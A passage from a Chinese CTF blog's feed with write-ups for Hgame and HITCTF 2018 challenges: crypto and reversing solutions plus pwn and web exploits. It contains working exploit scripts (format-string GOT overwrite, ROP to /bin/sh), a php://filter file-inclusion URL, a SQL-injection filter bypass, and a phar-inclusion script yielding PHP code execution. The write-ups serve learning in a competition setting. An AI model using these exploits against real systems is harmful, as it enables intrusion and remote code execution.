[esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="number">2</span>;</span><br><span class="line">  sub_80485FB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== online base64 decoder ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(aBuyIt);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the trial version, \x1B[0;31m%d\x1B[0m times left.\n"</span>, v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%255s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"exit"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( read_str(&amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      base64decode(&amp;s1);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;s1);</span><br><span class="line">      --v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个很显示的格式化字符串漏洞，程序只能printf两次，可以泄露stack地址，修改v1然后用DynELF，或者泄露函数地址，网上找libc。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0xffe6ade0 --&gt; 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">0004| 0xffe6ade4 --&gt; 0x8048ad3 (&quot;exit&quot;)</span><br><span class="line">0008| 0xffe6ade8 --&gt; 0xffe6af08 --&gt; 0x0 </span><br><span class="line">0012| 0xffe6adec --&gt; 0x8048888 (sub    esp,0xc)</span><br><span class="line">0016| 0xffe6adf0 --&gt; 0xf7eff000 --&gt; 0x23f3c </span><br><span class="line">0020| 0xffe6adf4 --&gt; 0x8048320 (&quot;__libc_start_main&quot;)</span><br><span class="line">0024| 0xffe6adf8 --&gt; 0x2 </span><br><span class="line">0028| 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">gdb-peda$ distance 0xffe6af08 0xffe6adf8</span><br><span class="line">From 0xffe6af08 to 0xffe6adf8: -272 bytes, -68 dwords</span><br></pre></td></tr></table></figure></p><p>按照官方提示用DynELF做，脚本如下：（注意覆盖v1的时候不要溢出了）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(<span class="string">'AAAA%2$pBBBB'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">stack_addr = int(p.recvuntil(<span class="string">'BBBB'</span>)[:<span class="number">-4</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="string">'stack_addr:%x'</span>,stack_addr)</span><br><span class="line"><span class="comment">#overwrite v1</span></span><br><span class="line">payload = p32(stack_addr<span class="number">-0x110</span>)+<span class="string">'%250c%7$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">'AAAA%10$sBBB'</span> + p32(addr)</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">  p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">  info = p.recvuntil(<span class="string">'BBB'</span>)[:<span class="number">-3</span>]</span><br><span class="line">  <span class="keyword">if</span> info == <span class="string">''</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">  <span class="keyword">return</span> info</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">d = DynELF(leak,elf=elf,libcdb=<span class="keyword">False</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">success(<span class="string">'system_addr:%x'</span>,system_addr)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">'printf'</span>]:system_addr&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">p.sendline(b64encode(<span class="string">'/bin/sh\0'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;终于补完了Hgame的pwn，学到很多新姿势。&lt;/p&gt;
&lt;h3 id=&quot;guess-number&quot;&gt;&lt;a href=&quot;#guess-number&quot; class=&quot;headerlink&quot; title=&quot;guess_number&quot;&gt;&lt;/a&gt;guess_number&lt;/h3&gt;&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2018-writeup</title>
    <link href="http://yoursite.com/2018/02/05/HITCTF2018-writeup/"/>
    <id>http://yoursite.com/2018/02/05/HITCTF2018-writeup/</id>
    <published>2018-02-05T01:12:04.000Z</published>
    <updated>2018-04-12T08:37:46.011Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easy-xor-apk"><a href="#easy-xor-apk" class="headerlink" title="easy_xor.apk"></a>easy_xor.apk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'kmqgwg]Tm3=NE_/4ouKJW@WE^'</span></span><br><span class="line">b=<span class="string">'#$%$#!&amp;#^_^~(:p@_*#######'</span></span><br><span class="line">c = [chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure><p>简单xor即可：HITCTF{w3lc0me_t0_hitctf}</p><h3 id="stackflow"><a href="#stackflow" class="headerlink" title="stackflow"></a>stackflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to pwn world!\nLeave your name:"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单栈溢出后ROP，程序自带可以<code>cat flag</code>的函数，其实也可以用<code>system(&#39;/bin/sh\0&#39;)</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  command = <span class="string">"cat flag"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xC0FFEE</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意<code>bss</code>中有<code>stdout</code>参数，不能直接写<code>bss+4</code>的位置，<code>fflush(stdout)</code>会报错<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">target = <span class="string">'stackoverflow'</span>  </span><br><span class="line">remote_addr = <span class="string">'pwn.sniperoj.cn'</span></span><br><span class="line">remote_port = <span class="number">30006</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./'</span>+target)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">offset= <span class="number">44</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">bss = <span class="number">0x804A04c</span>  <span class="comment">#bss+12</span></span><br><span class="line"><span class="comment">#payload = offset*'a' + p32(flag_addr) + p32(0) +p32(0xdeadbeef)+p32(0xc0ffee)</span></span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(read_addr) + p32(vuln_addr) +p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">'/bin/sh\0'</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(sys) + p32(vuln_addr)+p32(bss)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    flag = file.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        flag = base64.b64encode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag = base64.b32encode(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag_encode.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(flag)</span><br></pre></td></tr></table></figure><p>20次随机base64或base32编码，手工一下就行了</p><h3 id="单表替换"><a href="#单表替换" class="headerlink" title="单表替换"></a>单表替换</h3><p>手工替换即可，注意俄文也有分大小写的，原文是Gone with the wind</p><h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br></pre></td></tr></table></figure><p>弱类型绕过<code>passwd</code>的判断，用<code>with rollup</code>；由于过滤了<code>limit</code>，可以用<code>having passwd is null</code>解决。</p><h3 id="学习资料的密码"><a href="#学习资料的密码" class="headerlink" title="学习资料的密码"></a>学习资料的密码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Give me your key:"</span>);</span><br><span class="line">v7 = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x32</span>u);</span><br><span class="line">myRead(v7);</span><br><span class="line">v6 = basen(v7);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, &amp;v4) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've got my base :)"</span>);</span><br></pre></td></tr></table></figure><p>题目提供了加密后的flag，程序对输入进行运算后与加密内容比较，看看加密算法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v19 - v19 % <span class="number">3</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v22;</span><br><span class="line">    v2 = v22 + <span class="number">1</span>;</span><br><span class="line">    v20[v1] = chart[(a1[i] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v3 = v2++;</span><br><span class="line">    v20[v3] = chart[(a1[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v4 = v2++;</span><br><span class="line">    v20[v4] = chart[<span class="number">2</span> * a1[i] &amp; <span class="number">6</span> | (a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>];</span><br><span class="line">    v5 = v2++;</span><br><span class="line">    v20[v5] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v6 = v2++;</span><br><span class="line">    v20[v6] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v7 = v2++;</span><br><span class="line">    v20[v7] = chart[<span class="number">4</span> * a1[i + <span class="number">1</span>] &amp; <span class="number">4</span> | (a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>];</span><br><span class="line">    v20[v2] = chart[(a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v8 = v2 + <span class="number">1</span>;</span><br><span class="line">    v22 = v2 + <span class="number">2</span>;</span><br><span class="line">    v20[v8] = chart[a1[i + <span class="number">2</span>] &amp; <span class="number">7</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>重点在这段代码，算法是将3为明文转换成8位，多出来的位运算后面还有，但不重要。密文是67位，67%8=3，重点解决前面22位OK了。算法不难，可以直接进行每3位爆破，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="string">'llW00ml0lWeml3Weceec3m03c0e!0mc!cW0cl3ecc3lm!0eccllecmmWcmWcmWm3c!l'</span></span><br><span class="line">chart = <span class="string">'W3lc0me!'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">5</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">2</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">2</span> * ord(s[<span class="number">0</span>]) &amp; <span class="number">6</span> | (ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">4</span> * ord(s[<span class="number">1</span>]) &amp; <span class="number">4</span> | (ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[ord(s[<span class="number">2</span>]) &amp; <span class="number">7</span>]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                t = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> f(t) == a1[n*<span class="number">8</span>:n*<span class="number">8</span>+<span class="number">8</span>]:</span><br><span class="line">                    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    flag += foo(_)</span><br><span class="line">    <span class="keyword">print</span> flag   <span class="comment">#HITCTF&#123;3asy_b4se_3ight:)&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>主页存在文件包含，可查看源代码<br><code>http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login</code></p><p>login.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;CTF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">  ç»éè§£éæ´å¤åè½</span><br><span class="line">  &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    ç¨æ·å : &lt;input name=<span class="string">"username"</span> placeholder=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    å¯ç  : &lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"ç»é"</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username === <span class="string">"admin"</span> &amp;&amp; sha1(md5($password)) === $admin_hash)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'hitctf'</span>)&#123;</span><br><span class="line">          $logfile = <span class="string">"log/"</span>.$username.<span class="string">".log"</span>;</span><br><span class="line">          $content = $username.<span class="string">" =&gt; "</span>.$password;</span><br><span class="line">          file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>包含config.php有admin的hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$admin_hash = &quot;df650edd89a1abfb417124133daf4c103e6d2e97&quot;;</span><br></pre></td></tr></table></figure></p><p>思路：你用输入的username和password，写入log，然后文件包含，本题中间用了<code>=&gt;</code>做连接，预期解法用phar。需要修改php.ini的配置，去掉<code>phar.readonly</code>注释并改成off</p><p>1.phar生成时，php文件带有<code>=&gt;</code>关键字，建一个c文件夹，里面放一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'c.phar'</span>, <span class="number">0</span>, <span class="string">'c.phar'</span>);</span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="string">'./c'</span>);</span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">'e.php'</span>, <span class="string">' =&gt; .php'</span>));</span><br><span class="line">$phar-&gt;compressFiles(Phar::GZ);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">s = <span class="string">" =&gt; "</span></span><br><span class="line">host = <span class="string">"120.24.215.80"</span></span><br><span class="line">port = <span class="number">10012</span></span><br><span class="line">url = <span class="string">"http://%s:%d/login.php?debug=hitctf"</span> % (host, port)</span><br><span class="line">content = open(<span class="string">'c.phar'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">username = content[:<span class="number">15</span>]</span><br><span class="line">password = content[<span class="number">15</span> + len(s):]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] User : [%s]"</span> % (urllib.quote(username))</span><br><span class="line">data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">print</span> response.content</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] http://%s:%d/?page=phar://log/%s.log/c&amp;c=phpinfo();"</span> % (host, port, 